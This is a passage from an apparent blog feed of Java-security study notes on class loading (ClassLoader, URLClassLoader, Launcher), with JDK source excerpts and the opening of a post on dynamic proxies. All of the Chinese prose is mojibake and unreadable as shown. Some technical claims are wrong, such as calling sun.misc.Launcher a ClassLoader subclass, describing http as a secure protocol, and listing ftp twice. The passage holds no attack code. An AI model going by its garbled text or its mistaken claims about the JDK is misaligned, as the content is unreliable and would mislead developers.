c;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/13.png"></p><p>åˆ°nativeäº†ï¼Œå°±ä¸æ˜¯æˆ‘èƒ½çœ‹å¾—æ‡‚çš„äº†ï¼Œä¸è¿‡ä¹Ÿå·®ä¸å¤šäº†ï¼Œ<code>defineClass0\defineClass1\defineClass2</code>ï¼ŒCè¯­è¨€å†™çš„åŠ è½½ç±»çš„ä¸œè¥¿</p><p>ç”»ä¸ªå›¾å§ï¼Œå¤§æ¦‚çš„æµç¨‹å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­</p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/15.png"></p><p>å†æ¥çœ‹ä¸€å¼ é”™ç»¼å¤æ‚çš„å…³ç³»å›¾ï¼Œè¯¥å›¾åŒ…æ‹¬äº†ç±»åŠ è½½ä¸­å‡ ä¸ªé‡è¦çš„ç±»ä¹‹é—´çš„å…³ç³»</p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/14.png"></p><h3 id="0x04-ClassLoader"><a href="#0x04-ClassLoader" class="headerlink" title="0x04 ClassLoader"></a>0x04 <code>ClassLoader</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassLoader</span> </span>&#123;...&#125;<br></code></pre></td></tr></table></figure><p><code>ClassLoader</code> æ˜¯ Java ä¸­çš„ä¸€ä¸ªç±»ï¼Œç”¨äºåŠ è½½ Java ç±»çš„å­—èŠ‚ç åˆ° Java è™šæ‹Ÿæœºä¸­ï¼Œä½¿å¾— Java åº”ç”¨ç¨‹åºèƒ½å¤Ÿåœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½å’Œä½¿ç”¨ Java ç±»ã€‚<code>ClassLoader</code> ç±»ä½äº <code>java.lang</code> åŒ…ä¸­ï¼Œæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œç”¨äºå®šä¹‰ç±»åŠ è½½å™¨çš„è¡Œä¸ºå’Œæ–¹æ³•ã€‚</p><p><code>ClassLoader</code> ç±»çš„ä¸»è¦ä½œç”¨æ˜¯å°†ç¼–è¯‘åçš„ Java å­—èŠ‚ç æ–‡ä»¶ï¼ˆ.class æ–‡ä»¶ï¼‰åŠ è½½åˆ° Java è™šæ‹Ÿæœºä¸­ï¼Œå¹¶ç”Ÿæˆç›¸åº”çš„ Java ç±»ã€‚è¿™ä¸ªè¿‡ç¨‹å¯ä»¥é€šè¿‡ç»§æ‰¿ <code>ClassLoader</code> ç±»æ¥å®ç°è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ã€‚ä¸€ä¸ªè‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨éœ€è¦é‡å†™ <code>ClassLoader</code> ç±»ä¸­çš„ <code>findClass()</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„ç±»åä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªå¯¹åº”çš„ <code>Class</code> ç±»å‹å¯¹è±¡ã€‚å¦‚æœè‡ªå®šä¹‰ç±»åŠ è½½å™¨æ— æ³•æ‰¾åˆ°æŒ‡å®šç±»çš„å­—èŠ‚ç æ–‡ä»¶ï¼Œå®ƒå¯ä»¥å§”æ‰˜ç»™å…¶å®ƒçš„ç±»åŠ è½½å™¨æ¥è¿›è¡ŒæŸ¥æ‰¾ï¼Œæˆ–è€…æŠ›å‡º <code>ClassNotFoundException</code> å¼‚å¸¸ã€‚</p><h4 id="findClas"><a href="#findClas" class="headerlink" title="findClas"></a><code>findClas</code></h4><p>è¯¥æ–¹æ³•ç”¨äºæŸ¥æ‰¾å¹¶åŠ è½½æŒ‡å®šåç§°çš„ç±»ã€‚å¦‚æœå­ç±»éœ€è¦åŠ è½½ä¸€ä¸ªæ–°ç±»ï¼Œåˆ™éœ€è¦é‡å†™è¯¥æ–¹æ³•ã€‚å¦‚æœçˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½è¯¥ç±»ï¼Œå­ç±»åŠ è½½å™¨å°†ä¼šè°ƒç”¨è¯¥æ–¹æ³•è¿›è¡ŒæŸ¥æ‰¾å’ŒåŠ è½½ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥æ–¹æ³•åªèƒ½æŸ¥æ‰¾æœ¬åœ°ç£ç›˜æˆ–ç½‘ç»œä¸Šçš„ .class æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥åŠ è½½ .java æºæ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// name: å…¨ç±»å</span><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ClassNotFoundException(name);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a><code>defineClass</code></h4><p>ç”¨äºå°†ä¸€ä¸ªå­—èŠ‚æ•°ç»„è½¬æ¢æˆä¸€ä¸ª Class å¯¹è±¡ï¼Œå¹¶åŠ è½½åˆ°è™šæ‹Ÿæœºä¸­ã€‚è¯¥æ–¹æ³•é€šå¸¸åœ¨ <code>findClass()</code> æ–¹æ³•ä¸­ä½¿ç”¨ï¼Œç”¨äºå°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½åˆ°è™šæ‹Ÿæœºä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// b: .classæ–‡ä»¶çš„å­—èŠ‚ç æ•°ç»„</span><br><span class="hljs-comment">// off: å­—èŠ‚ç æ•°ç»„èµ·å§‹ä½ç½®</span><br><span class="hljs-comment">// len: å­—èŠ‚ç æ•°ç»„é•¿åº¦</span><br><span class="hljs-comment">// protectionDomain: ä¿æŠ¤åŸŸ</span><br><span class="hljs-comment">// name: ç±»çš„å…¨ç±»å</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(<span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len) <span class="hljs-keyword">throws</span> ClassFormatError&#123;<br>    <span class="hljs-keyword">return</span> defineClass(<span class="hljs-keyword">null</span>, b, off, len, <span class="hljs-keyword">null</span>);<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len) <span class="hljs-keyword">throws</span> ClassFormatError&#123;<br>    <span class="hljs-keyword">return</span> defineClass(name, b, off, len, <span class="hljs-keyword">null</span>);<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len,<br>                                     ProtectionDomain protectionDomain)<br>    <span class="hljs-keyword">throws</span> ClassFormatError<br>&#123;<br>    protectionDomain = preDefineClass(name, protectionDomain);<br>    String source = defineClassSourceLocation(protectionDomain);<br>    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);<br>    postDefineClass(c, protectionDomain);<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="defineClassX"><a href="#defineClassX" class="headerlink" title="defineClassX"></a><code>defineClassX</code></h4><p>äºå°†ä¸€ä¸ªå­—èŠ‚æ•°ç»„è½¬æ¢æˆä¸€ä¸ª Class å¯¹è±¡ï¼Œå¹¶åŠ è½½åˆ°è™šæ‹Ÿæœºä¸­ã€‚è¯¥æ–¹æ³•é€šå¸¸åœ¨ <code>defineClass()</code> æ–¹æ³•ä¸­ä½¿ç”¨ï¼Œç”¨äºå°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½åˆ°è™šæ‹Ÿæœºä¸­ã€‚è¯¥æ–¹æ³•æ‰æ˜¯çœŸæ­£å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸ºJavaå¯¹è±¡çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„å®ç°æ˜¯ç”±æœ¬åœ°ä»£ç ï¼ˆå¦‚ Cã€C++ ä»£ç ï¼‰å®ç°çš„ã€‚ä¹Ÿå°±æ˜¯Javaä»£ç ä¸­çš„æœ€åº•å±‚äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// nameï¼šè¦åŠ è½½çš„ç±»çš„åç§°ï¼Œå¿…é¡»ä¸å­—èŠ‚æ•°ç»„ä¸­çš„ç±»åç›¸åŒã€‚</span><br><span class="hljs-comment">// bï¼šè¦åŠ è½½çš„ç±»çš„å­—èŠ‚æ•°ç»„ã€‚</span><br><span class="hljs-comment">// offï¼šå­—èŠ‚æ•°ç»„ä¸­çš„åç§»é‡ï¼Œå³ä»å­—èŠ‚æ•°ç»„çš„å“ªä¸ªä½ç½®å¼€å§‹è¯»å–ç±»çš„å­—èŠ‚ç ã€‚</span><br><span class="hljs-comment">// lenï¼šè¦è¯»å–çš„å­—èŠ‚æ•°ï¼Œå³ç±»å­—èŠ‚ç çš„é•¿åº¦ã€‚</span><br><span class="hljs-comment">// pdï¼šè¯¥ç±»çš„ä¿æŠ¤åŸŸï¼Œç”¨äºæ§åˆ¶ç±»çš„è®¿é—®æƒé™ã€‚</span><br><span class="hljs-comment">// sourceï¼šè¯¥ç±»çš„æ¥æºï¼Œç”¨äºè®°å½•ç±»æ˜¯ä»å“ªé‡ŒåŠ è½½çš„ã€‚</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClass0(String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len,<br>                                     ProtectionDomain pd);<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClass1(String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len,<br>                                     ProtectionDomain pd, String source);<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; defineClass2(String name, java.nio.ByteBuffer b,<br>                                     <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len, ProtectionDomain pd,<br>                                     String source);<br></code></pre></td></tr></table></figure><h4 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a><code>loadClass</code></h4><p>æ–¹æ³•ç”¨äºåŠ è½½ä¸€ä¸ªç±»ï¼Œå¹¶ä¸”å¯ä»¥æŒ‡å®šæ˜¯å¦éœ€è¦è§£æè¯¥ç±»ã€‚å¦‚æœ resolve å‚æ•°ä¸º trueï¼Œåˆ™ä¼šè‡ªåŠ¨è§£æè¯¥ç±»ä¾èµ–çš„å…¶å®ƒç±»ã€‚å¦‚æœ resolve å‚æ•°ä¸º falseï¼Œåˆ™åªä¼šåŠ è½½è¯¥ç±»ï¼Œä¸ä¼šè§£æå…¶å®ƒç±»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¯¥ç±»å·²ç»è¢«åŠ è½½ï¼Œè¯¥æ–¹æ³•ä¸ä¼šé‡æ–°åŠ è½½ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›å·²ç»åŠ è½½çš„ç±»ã€‚è¯¥æ–¹æ³•ä¹Ÿæ˜¯åŒäº²å§”æ´¾æœºåˆ¶çš„å…·ä½“ä½“ç°çš„åœ°æ–¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// name: å…¨ç±»å</span><br><span class="hljs-comment">// resolve: æ˜¯å¦è§£æè¯¥ç±»ï¼Œé»˜è®¤ä¸ºfalse</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    <span class="hljs-keyword">return</span> loadClass(name, <span class="hljs-keyword">false</span>);<br>&#125;<br><br><span class="hljs-keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-keyword">boolean</span> resolve)<br>    <span class="hljs-keyword">throws</span> ClassNotFoundException<br>&#123;<br>    <span class="hljs-keyword">synchronized</span> (getClassLoadingLock(name)) &#123;<br>        <span class="hljs-comment">// First, check if the class has already been loaded</span><br>        Class&lt;?&gt; c = findLoadedClass(name);<br>        <span class="hljs-keyword">if</span> (c == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">long</span> t0 = System.nanoTime();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (parent != <span class="hljs-keyword">null</span>) &#123;<br>                    c = parent.loadClass(name, <span class="hljs-keyword">false</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    c = findBootstrapClassOrNull(name);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>                <span class="hljs-comment">// ClassNotFoundException thrown if class not found</span><br>                <span class="hljs-comment">// from the non-null parent class loader</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-comment">// If still not found, then invoke findClass in order</span><br>                <span class="hljs-comment">// to find the class.</span><br>                <span class="hljs-keyword">long</span> t1 = System.nanoTime();<br>                c = findClass(name);<br><br>                <span class="hljs-comment">// this is the defining class loader; record the stats</span><br>                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);<br>                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);<br>                sun.misc.PerfCounter.getFindClasses().increment();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (resolve) &#123;<br>            resolveClass(c);<br>        &#125;<br>        <span class="hljs-keyword">return</span> c;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="getSystemClassLoader"><a href="#getSystemClassLoader" class="headerlink" title="getSystemClassLoader()"></a><code>getSystemClassLoader()</code></h4><p>è·å–ç³»ç»Ÿç±»åŠ è½½å™¨ã€‚ç³»ç»Ÿç±»åŠ è½½å™¨æ˜¯ç”¨æ¥åŠ è½½åº”ç”¨ç¨‹åºä¸­çš„ç±»çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ClassLoader <span class="hljs-title">getSystemClassLoader</span><span class="hljs-params">()</span> </span>&#123;<br>    initSystemClassLoader();<br>    <span class="hljs-keyword">if</span> (scl == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    SecurityManager sm = System.getSecurityManager();<br>    <span class="hljs-keyword">if</span> (sm != <span class="hljs-keyword">null</span>) &#123;<br>        checkClassLoaderPermission(scl, Reflection.getCallerClass());<br>    &#125;<br>    <span class="hljs-keyword">return</span> scl;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x05-URLClassLoader"><a href="#0x05-URLClassLoader" class="headerlink" title="0x05 URLClassLoader"></a>0x05 <code>URLClassLoader</code></h3><p>æ­¤ç±»åŠ è½½å™¨ç”¨äºä»å¼•ç”¨JARæ–‡ä»¶å’Œç›®å½•çš„URLçš„æœç´¢è·¯å¾„åŠ è½½ç±»å’Œèµ„æºã€‚  ä»»ä½•ä»¥â€œ/â€ç»“å°¾çš„URLéƒ½å‡å®šæ˜¯æŒ‡ä¸€ä¸ªç›®å½•ã€‚ å¦åˆ™ï¼ŒURLè¢«è®¤ä¸ºæ˜¯æŒ‡æ ¹æ®éœ€è¦æ‰“å¼€çš„JARæ–‡ä»¶ã€‚ </p><p>è¯¥ç±»æ˜¯Java ä¸­çš„ä¸€ä¸ªç±»åŠ è½½å™¨ï¼Œå¯ä»¥ä»æŒ‡å®šçš„ <strong>URL</strong> ä¸­åŠ è½½ç±»å’Œèµ„æºã€‚å®ƒæ˜¯ <code>ClassLoader</code> çš„å­ç±»ï¼Œé‡å†™äº†çˆ¶ç±»ä¸­çš„ä¸€äº›æ–¹æ³•ï¼Œå¹¶æ·»åŠ äº†ä¸€äº›è‡ªå·±çš„æ–¹æ³•ï¼Œä»¥æ”¯æŒä» URL ä¸­åŠ è½½ç±»å’Œèµ„æºã€‚è¿™é‡Œå°±ä¸å¾—ä¸è¯´ä¸€ä¸‹è¯¥ç±»æ”¯æŒçš„åè®®äº†ï¼Œå…¶å®å’ŒURLä¸€æ ·</p><ol><li><code>file</code> åè®®ï¼šè¡¨ç¤ºæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚å¯ä»¥é€šè¿‡ <code>file:///path/to/class/file</code> çš„æ–¹å¼åŠ è½½æœ¬åœ°çš„ <code>.class</code> æ–‡ä»¶ã€‚</li><li><code>jar</code> åè®®ï¼šè¡¨ç¤º Jar åŒ…æ–‡ä»¶ã€‚å¯ä»¥é€šè¿‡ <code>jar:file:/path/to/jar/file!/path/to/class/file</code> çš„æ–¹å¼åŠ è½½ Jar åŒ…ä¸­çš„ <code>.class</code> æ–‡ä»¶ã€‚</li><li><code>ftp</code> åè®®ï¼šè¡¨ç¤ºæ–‡ä»¶ä¼ è¾“åè®®ã€‚å¯ä»¥é€šè¿‡ <code>ftp://host/path/to/class/file</code> çš„æ–¹å¼åŠ è½½è¿œç¨‹ FTP æœåŠ¡å™¨ä¸­çš„ <code>.class</code> æ–‡ä»¶ã€‚</li><li><code>http</code> åè®®ï¼šè¡¨ç¤º HTTP å®‰å…¨åè®®ã€‚å¯ä»¥é€šè¿‡ <code>http://host/path/to/class/file</code> çš„æ–¹å¼åŠ è½½è¿œç¨‹ HTTPS æœåŠ¡å™¨ä¸­çš„ <code>.class</code> æ–‡ä»¶ã€‚</li><li><code>https</code> åè®®ï¼šè¡¨ç¤º HTTP å®‰å…¨åè®®ã€‚å¯ä»¥é€šè¿‡ <code>https://host/path/to/class/file</code> çš„æ–¹å¼åŠ è½½è¿œç¨‹ HTTPS æœåŠ¡å™¨ä¸­çš„ <code>.class</code> æ–‡ä»¶ã€‚</li><li><code>ftp</code> åè®®ï¼šè¡¨ç¤ºæ–‡ä»¶ä¼ è¾“åè®®ã€‚å¯ä»¥é€šè¿‡ <code>ftp://host/path/to/class/file</code> çš„æ–¹å¼åŠ è½½è¿œç¨‹ FTP æœåŠ¡å™¨ä¸­çš„ <code>.class</code> æ–‡ä»¶ã€‚</li></ol><p><code>URLClassLoader</code> é‡å†™äº† <code>ClassLoader</code> ä¸­çš„ <code>findClass</code> æ–¹æ³•å’Œ <code>definePackage</code> æ–¹æ³•ï¼Œå¹¶æ·»åŠ äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•ï¼š</p><h4 id="addURL"><a href="#addURL" class="headerlink" title="addURL"></a><code>addURL</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// url: éœ€è¦åŠ è½½ç±»çš„URLè·¯å¾„</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addURL</span><span class="hljs-params">(URL url)</span> </span>&#123; ucp.addURL(url);&#125;<br></code></pre></td></tr></table></figure><h4 id="close"><a href="#close" class="headerlink" title="close()"></a><code>close()</code></h4><p>å…³é—­è¯¥ç±»åŠ è½½å™¨ï¼Œå¹¶é‡Šæ”¾ç›¸å…³èµ„æºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;...&#125;<br></code></pre></td></tr></table></figure><h4 id="getURLs"><a href="#getURLs" class="headerlink" title="getURLs()"></a><code>getURLs()</code></h4><p>è·å–è¯¥ç±»åŠ è½½å™¨å·²åŠ è½½çš„ URL æ•°ç»„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> URL[] getURLs() &#123;<span class="hljs-keyword">return</span> ucp.getURLs();&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä½™çš„ä¸€äº›æ–¹æ³•ï¼ŒåŸºæœ¬å’Œ<code>ClassLoader</code>ç›¸ä¼¼</p><h3 id="0x06-Launcher"><a href="#0x06-Launcher" class="headerlink" title="0x06 Launcher"></a>0x06 <code>Launcher</code></h3><p><code>sun.misc.Launcher</code> ç±»æ˜¯ JDK å†…éƒ¨ä½¿ç”¨çš„ç±»ï¼Œå®ƒæ˜¯ <code>java.lang.ClassLoader</code> ç±»çš„ä¸€ä¸ªå­ç±»ï¼Œä¸»è¦ç”¨äºåŠ è½½ JDK è‡ªå¸¦çš„ä¸€äº›æ ¸å¿ƒç±»åº“å’Œå·¥å…·ç±»ã€‚åœ¨JDKä¸­ï¼Œ<code>sun.misc.Launcher</code> ç±»ä¸»è¦æœ‰ä¸¤ä¸ªå­ç±»ï¼š<code>sun.misc.Launcher.AppClassLoader</code> å’Œ <code>sun.misc.Launcher.ExtClassLoader</code>ã€‚å…¶ä¸­ <code>sun.misc.Launcher.AppClassLoader</code> ç”¨äºåŠ è½½åº”ç”¨ç¨‹åºç±»ï¼Œ<code>sun.misc.Launcher.ExtClassLoader</code> ç”¨äºåŠ è½½ JDK æ‰©å±•ç±»åº“ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº <code>sun.misc.Launcher</code> ç±»æ˜¯ JDK å†…éƒ¨ä½¿ç”¨çš„ç±»ï¼Œä¸å±äº Java æ ‡å‡†åº“ï¼Œå› æ­¤åœ¨ Java 9 ä¸­å·²ç»è¢«ç§»é™¤ã€‚åœ¨ Java 9 åŠä»¥åçš„ç‰ˆæœ¬ä¸­ï¼Œåº”è¯¥ä½¿ç”¨ <code>java.lang.invoke.MethodHandles.Lookup</code> ç±»æ¥æ›¿ä»£ <code>sun.misc.Launcher</code> ç±»ä¸­çš„ä¸€äº›åŠŸèƒ½ã€‚</p><ol><li><code>getLauncher()</code>ï¼šè¿”å›å½“å‰çº¿ç¨‹ä½¿ç”¨çš„ <code>Launcher</code> å®ä¾‹ã€‚</li><li><code>getBootstrapClassPath()</code>ï¼šè¿”å›å¼•å¯¼ç±»åŠ è½½å™¨çš„ç±»è·¯å¾„ã€‚</li><li><code>getAppClassLoader()</code>ï¼šè¿”å›åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ã€‚</li><li><code>getExtClassLoader()</code>ï¼šè¿”å›æ‰©å±•ç±»åŠ è½½å™¨ã€‚</li><li><code>findClass(String name)</code>ï¼šåœ¨å¼•å¯¼ç±»åŠ è½½å™¨å’Œæ‰©å±•ç±»åŠ è½½å™¨ä¸­æŸ¥æ‰¾æŒ‡å®šåç§°çš„ç±»ã€‚</li><li><code>findLoadedClass0(String name)</code>ï¼šæŸ¥æ‰¾æŒ‡å®šåç§°çš„å·²åŠ è½½çš„ç±»ã€‚</li></ol><h3 id="0x07-å‚è€ƒé“¾æ¥"><a href="#0x07-å‚è€ƒé“¾æ¥" class="headerlink" title="0x07 å‚è€ƒé“¾æ¥"></a>0x07 å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://xz.aliyun.com/t/9002">JAVAå®‰å…¨åŸºç¡€ï¼ˆä¸€ï¼‰â€“ç±»åŠ è½½å™¨ï¼ˆClassLoaderï¼‰</a></li><li><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&vd_source=db93b94230228cb739b48f4f59e74abd">Javaååºåˆ—åŒ–æ¼æ´ä¸“é¢˜-åŸºç¡€ç¯‡-ç±»çš„åŠ¨æ€åŠ è½½</a></li><li><a href="https://blog.csdn.net/xyy1028/article/details/122575090">Javaç±»åŠ è½½å™¨</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaåŠ¨æ€ä»£ç†</title>
    <link href="/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="JavaåŠ¨æ€ä»£ç†"><a href="#JavaåŠ¨æ€ä»£ç†" class="headerlink" title="JavaåŠ¨æ€ä»£ç†"></a>JavaåŠ¨æ€ä»£ç†</h2><h3 id="0x00å‰è¨€"><a href="#0x00å‰è¨€" class="headerlink" title="0x00å‰è¨€"></a>0x00å‰è¨€</h3><p>å› ä¸ºåŠ¨æ€ä»£ç†ä½¿ç”¨çš„æ¯”è¾ƒå¹¿æ³›ï¼Œå¹¶ä¸”åœ¨å­¦ä¹ Javaä»£ç å®¡è®¡çš„æ—¶å€™ç»å¸¸æ€§èƒ½å¤Ÿç”¨åˆ°ï¼Œæ•…åœ¨æ­¤å­¦ä¹ ä¸€ä¸‹ï¼Œè®°å½•ä¸€æ‰‹ã€‚å¦‚æœ‰é”™è¯¯ï¼Œæœ›æŒ‡å‡º</p><p>ä»£ç†æœºåˆ¶æ˜¯ä¸€ç§å¸¸è§çš„è®¾è®¡æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§é—´æ¥è®¿é—®æŸä¸ªå¯¹è±¡çš„æ–¹å¼ï¼Œå¯ä»¥åœ¨ä¸æ”¹å˜åŸæœ‰ä»£ç çš„æƒ…å†µä¸‹ï¼Œå¢å¼ºç›®æ ‡å¯¹è±¡çš„åŠŸèƒ½ã€‚ä»£ç†æœºåˆ¶ä¸€èˆ¬åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ä¸¤ç§ã€‚</p><h3 id="0x01-é™æ€ä»£ç†"><a href="#0x01-é™æ€ä»£ç†" class="headerlink" title="0x01 é™æ€ä»£ç†"></a>0x01 